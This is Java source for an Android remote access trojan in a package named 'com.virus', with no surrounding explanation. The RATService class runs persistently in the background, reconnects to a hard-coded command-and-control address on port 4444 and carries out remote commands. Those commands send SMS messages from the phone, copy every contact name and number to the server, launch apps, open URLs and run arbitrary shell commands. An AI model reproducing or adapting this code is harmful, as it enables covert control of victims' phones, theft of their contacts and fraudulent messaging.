package com.virus;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.IBinder;
import android.provider.Settings;
import java.io.*;
import java.net.*;
import android.content.Context;
import android.telephony.SmsManager;
import android.provider.ContactsContract;
import android.database.Cursor;
import android.hardware.Camera;
import android.media.MediaRecorder;

public class RATService extends Service {
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private String serverIp = "192.168.11.101";  // CHANGE THIS
    private int serverPort = 4444;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(this::connectToC2).start();
        return START_STICKY;
    }

    private void connectToC2() {
        while (true) {
            try {
                socket = new Socket();
                socket.connect(new InetSocketAddress(serverIp, serverPort), 10000);
                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                out.println("DEVICE_CONNECTED:" + android.os.Build.MODEL);

                String command;
                while ((command = in.readLine()) != null) {
                    handleCommand(command);
                }
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            }
        }
    }

    private void handleCommand(String cmd) {
        try {
            if (cmd.startsWith("SMS ")) {
                String[] parts = cmd.split(" ", 3);
                SmsManager.getDefault().sendTextMessage(parts[1], null, parts[2], null, null);
            } else if (cmd.equals("DUMP_CONTACTS")) {
                dumpContacts();
            } else if (cmd.equals("RECORD_AUDIO")) {
                // MediaRecorder audio streaming
            } else if (cmd.startsWith("RUN_APP ")) {
                String packageName = cmd.substring(8).trim();
                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
                if (launchIntent != null) {
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(launchIntent);
                    out.println("APP_LAUNCHED:" + packageName);
                } else {
                    out.println("APP_NOT_FOUND:" + packageName);
                }
            } else if (cmd.startsWith("OPEN_VIDEO ")) {
                String videoUrl = cmd.substring(11).trim();
                Intent videoIntent = new Intent(Intent.ACTION_VIEW);
                videoIntent.setDataAndType(Uri.parse(videoUrl), "video/*");
                videoIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(videoIntent);
                out.println("VIDEO_OPENED:" + videoUrl);
            } else if (cmd.startsWith("SHELL ")) {
                Runtime.getRuntime().exec(cmd.substring(6));
            }
        } catch (Exception e) {
            out.println("ERROR:" + e.getMessage());
        }
    }

    private void dumpContacts() {
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        StringBuilder sb = new StringBuilder();
        while (cursor != null && cursor.moveToNext()) {
            sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(":");
            sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
        }
        if (cursor != null) cursor.close();
        out.println(sb.toString());
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
